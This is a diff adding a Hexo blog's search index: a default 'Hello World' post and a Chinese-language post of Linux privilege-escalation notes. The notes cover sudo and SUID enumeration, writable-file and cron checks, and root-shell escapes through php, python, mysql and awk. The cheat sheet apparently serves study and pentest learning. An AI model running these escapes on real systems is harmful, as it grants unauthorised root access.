@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello Worldhaha</title>
+    <url>/b822f9c7.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick_Start"><a href="#Quick_Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create_a_new_post"><a href="#Create_a_new_post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run_server"><a href="#Run_server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate_static_files"><a href="#Generate_static_files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy_to_remote_sites"><a href="#Deploy_to_remote_sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>提权</title>
+    <url>/e2181504.html</url>
+    <content><![CDATA[<h2 id="u63D0_u6743_u9014_u5F84"><a href="#u63D0_u6743_u9014_u5F84" class="headerlink" title="提权途径"></a>提权途径</h2><blockquote>
+<ol>
+<li><strong>sudo</strong>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l //查询具有sudo权限命令</span><br></pre></td></tr></table></figure></li>
+<li><strong>suid</strong>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s <span class="built_in">type</span> f 2&gt;/dev/null //查询具有suid执行权限程序</span><br></pre></td></tr></table></figure>
+可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget</code>  </li>
+<li><strong>通过在/etc/passwd添加一个root权限账户</strong>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null //查询可写权限的文件</span><br></pre></td></tr></table></figure></li>
+<li><strong>查看/etc/cron*下所含的所有文件</strong>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /etc/cron* //cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<h2 id="u63D0_u6743"><a href="#u63D0_u6743" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<ol>
+<li><strong>php</strong>  </li>
+</ol>
+<ul>
+<li>sudo<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">sudo php -r <span class="string">&quot;system(&#x27;<span class="variable">$CMD</span>&#x27;);&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>suid<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sh -c <span class="string">&#x27;cp $(which php) .; chmod +s ./php&#x27;</span></span><br><span class="line">CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">./php -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;,[&#x27;-p&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li><strong>python</strong></li>
+</ol>
+<ul>
+<li>sudo  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span>  //python&lt;3</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="3">
+<li><strong>mysql</strong>  </li>
+</ol>
+<ul>
+<li>sudo<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root mysql -e <span class="string">&#x27;\! /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="4">
+<li><strong>awk/mawk</strong>  </li>
+</ol>
+<ul>
+<li>sudo<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line">mawk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+]]></content>
+  </entry>
+</search>
